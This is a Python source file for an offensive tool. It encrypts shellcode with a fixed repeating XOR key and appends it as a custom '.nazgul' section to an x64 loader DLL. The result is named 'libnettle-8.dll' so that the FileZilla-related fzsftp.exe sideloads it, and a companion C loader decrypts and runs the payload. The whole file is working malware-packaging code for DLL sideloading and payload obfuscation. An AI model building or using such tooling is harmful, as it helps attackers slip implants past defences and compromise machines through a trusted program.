#!/usr/bin/env python3
"""Encrypt a shellcode blob and embed it as a loadable ``.nazgul`` section in a PE.

Mirrors the runtime side in ``SideeLoader.c`` (``LoadSc``):

* The loader locates the ``.nazgul`` section of its own mapped image.
* It copies ``SizeOfRawData`` bytes from ``image + VirtualAddress`` into a fresh
  RW bufferruntime, then XOR-decrypts in place with a repeating 8-byte key and executes
  the buffer.

So this tool:

1. pads the plaintext payload to ``SizeOfRawData`` with zeros,
2. XOR-encrypts it with the same key (XOR is symmetric -> loader recovers plain),
3. appends a new ``.nazgul`` section header + raw data to the PE,
4. bumps ``NumberOfSections`` and ``SizeOfImage``.

The output filename must match the DLL the sideloading target imports
(``fzsftp.exe`` -> ``libnettle-8.dll``).

Only PE32+ (x64) images are supported. The tool is self-verifying: it re-parses
its own output and asserts the section is loadable and the XOR round-trips back
to the original payload.
"""

import argparse
import struct
import sys

# Repeating XOR key -- MUST match `Key[]` in SideeLoader.c :: LoadSc.
XOR_KEY = bytes([0x63, 0x24, 0x9F, 0x18, 0xC0, 0x5D, 0xE7, 0xB2])

SECTION_NAME = b".nazgul"  # 7 bytes + implicit NUL == exactly Name[8]

# IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
SECTION_CHARS = 0x40000040 | 0x80000000 | 0x40  # == 0xC0000040

IMAGE_FILE_MACHINE_AMD64 = 0x8664
PE32_PLUS_MAGIC = 0x20B


def _round_up(value: int, align: int) -> int:
    return ((value + align - 1) // align) * align


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """Symmetric repeating-key XOR (matches the C decrypt loop)."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


class PE:
    """Minimal PE32+ header view for section injection."""

    def __init__(self, blob: bytes):
        self.d = bytearray(blob)
        if self.d[:2] != b"MZ":
            raise ValueError("not a PE (missing MZ)")
        self.e_lfanew = struct.unpack_from("<I", self.d, 0x3C)[0]
        if self.d[self.e_lfanew:self.e_lfanew + 4] != b"PE\0\0":
            raise ValueError("not a PE (missing PE signature)")
        self.coff = self.e_lfanew + 4
        machine = struct.unpack_from("<H", self.d, self.coff)[0]
        if machine != IMAGE_FILE_MACHINE_AMD64:
            raise ValueError(f"unsupported machine 0x{machine:04x} (need amd64)")
        self.n_sections = struct.unpack_from("<H", self.d, self.coff + 2)[0]
        self.size_opt = struct.unpack_from("<H", self.d, self.coff + 16)[0]
        self.opt = self.coff + 20
        magic = struct.unpack_from("<H", self.d, self.opt)[0]
        if magic != PE32_PLUS_MAGIC:
            raise ValueError(f"unsupported optional magic 0x{magic:04x} (need PE32+)")
        # PE32+ optional header offsets
        self.sect_align = struct.unpack_from("<I", self.d, self.opt + 32)[0]
        self.file_align = struct.unpack_from("<I", self.d, self.opt + 36)[0]
        self.size_image_off = self.opt + 56
        self.size_headers_off = self.opt + 60
        self.size_image = struct.unpack_from("<I", self.d, self.size_image_off)[0]
        self.size_headers = struct.unpack_from("<I", self.d, self.size_headers_off)[0]
        self.sec_table = self.opt + self.size_opt

    def section_headers(self):
        out = []
        for i in range(self.n_sections):
            off = self.sec_table + i * 40
            out.append((off, self.d[off:off + 40]))
        return out

    def add_section(self, name: bytes, raw: bytes, characteristics: int):
        if len(name) > 8:
            raise ValueError("section name too long")
        hdr_end = self.sec_table + (self.n_sections + 1) * 40
        if hdr_end > self.size_headers:
            raise ValueError(
                f"no header room for new section (need {hdr_end:#x} <= SizeOfHeaders {self.size_headers:#x})"
            )

        # VirtualAddress: continue after the current image end (already aligned).
        va = _round_up(self.size_image, self.sect_align)
        virtual_size = len(raw)
        size_raw = _round_up(len(raw), self.file_align)
        # Raw data appended at end of file, file-aligned.
        ptr_raw = _round_up(len(self.d), self.file_align)

        name8 = name.ljust(8, b"\0")
        hdr = name8 + struct.pack(
            "<IIIIIIHHI",
            virtual_size,
            va,
            size_raw,
            ptr_raw,
            0, 0, 0, 0,
            characteristics,
        )
        off = self.sec_table + self.n_sections * 40
        self.d[off:off + 40] = hdr

        # pad file to ptr_raw, then write padded raw payload
        if len(self.d) < ptr_raw:
            self.d.extend(b"\0" * (ptr_raw - len(self.d)))
        padded = raw.ljust(size_raw, b"\0")
        self.d[ptr_raw:ptr_raw + size_raw] = padded

        # bump counts
        self.n_sections += 1
        struct.pack_into("<H", self.d, self.coff + 2, self.n_sections)
        new_size_image = _round_up(va + virtual_size, self.sect_align)
        struct.pack_into("<I", self.d, self.size_image_off, new_size_image)
        self.size_image = new_size_image

        return {
            "va": va, "virtual_size": virtual_size,
            "size_raw": size_raw, "ptr_raw": ptr_raw, "end_rva": va + virtual_size,
        }


def verify(pe_path: str, payload: bytes) -> None:
    """Re-open the output and assert the section is loadable and decrypts back."""
    pe = PE(open(pe_path, "rb").read())
    hits = []
    for off, hdr in pe.section_headers():
        nm = hdr[:8].rstrip(b"\0")
        if nm == SECTION_NAME:
            vsize, va, sraw, ptr = struct.unpack_from("<IIII", hdr, 8)
            chars = struct.unpack_from("<I", hdr, 36)[0]
            hits.append((va, vsize, sraw, ptr, chars))
    if len(hits) != 1:
        raise SystemExit(f"verify: expected exactly one .nazgul section, found {len(hits)}")
    va, vsize, sraw, ptr, chars = hits[0]
    if not (chars & 0x40000000):
        raise SystemExit("verify: section not IMAGE_SCN_MEM_READ (would not be mapped)")
    if va + vsize > pe.size_image:
        raise SystemExit("verify: section extends past SizeOfImage")
    if va % pe.sect_align != 0:
        raise SystemExit("verify: section VA not SectionAlignment-aligned")
    raw = pe.d[ptr:ptr + sraw]
    dec = xor_crypt(raw, XOR_KEY)
    if dec[:len(payload)] != payload:
        raise SystemExit("verify: XOR round-trip mismatch")

    print(f"[verify] section VA=0x{va:x} VirtualSize={vsize} SizeOfRawData=0x{sraw:x} "
          f"PointerToRawData=0x{ptr:x} Chars=0x{chars:08x}")
    print(f"[verify] SizeOfImage=0x{pe.size_image:x} NumberOfSections={pe.n_sections}")
    print(f"[verify] XOR round-trip OK ({len(payload)} payload bytes recover)")


def main() -> int:
    ap = argparse.ArgumentParser(description="Encrypt shellcode and embed as .nazgul PE section.")
    ap.add_argument("--pe", required=True, help="Input PE (loader.dll).")
    ap.add_argument("--sc", required=True, help="Shellcode blob to embed (agent.x64.bin).")
    ap.add_argument("--output", required=True, help="Output PE (e.g. libnettle-8.dll).")
    args = ap.parse_args()

    pe_blob = open(args.pe, "rb").read()
    payload = open(args.sc, "rb").read()
    if not payload:
        raise SystemExit("empty shellcode blob")

    pe = PE(pe_blob)
    # Pad plaintext to a FileAlignment multiple with zeros so the loader's XOR
    # decrypt reconstructs exactly `payload || zeros` (no garbage tail).
    plain_padded = payload.ljust(_round_up(len(payload), pe.file_align), b"\0")
    encrypted = xor_crypt(plain_padded, XOR_KEY)

    info = pe.add_section(SECTION_NAME, encrypted, SECTION_CHARS)
    open(args.output, "wb").write(pe.d)

    print(f"[*] embedded {len(payload)} shellcode bytes as .nazgul")
    print(f"[*] VA=0x{info['va']:x}  SizeOfRawData=0x{info['size_raw']:x}  "
          f"PointerToRawData=0x{info['ptr_raw']:x}  SizeOfImage=0x{pe.size_image:x}")
    verify(args.output, payload)
    print(f"[+] wrote {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
